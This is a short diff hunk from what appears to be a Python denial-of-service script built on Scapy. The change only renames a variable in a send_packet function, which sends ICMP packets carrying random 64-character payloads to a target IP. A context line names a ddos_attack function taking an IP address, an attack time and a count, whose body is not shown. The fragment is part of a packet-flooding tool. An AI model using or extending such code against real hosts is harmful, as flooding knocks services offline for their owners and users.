@@ -11,8 +11,8 @@ def send_packet(dst_ip):
     # Generate random content
     print(dst_ip)
     random_content = ''.join(random.choices(string.ascii_letters + string.digits, k=64))
-    packet = IP(dst=dst_ip) / ICMP() / random_content
-    send(packet)
+    att_packet = IP(dst=dst_ip) / ICMP() / random_content
+    send(att_packet)
 
 
 def ddos_attack(ip_addr, attack_time, k):
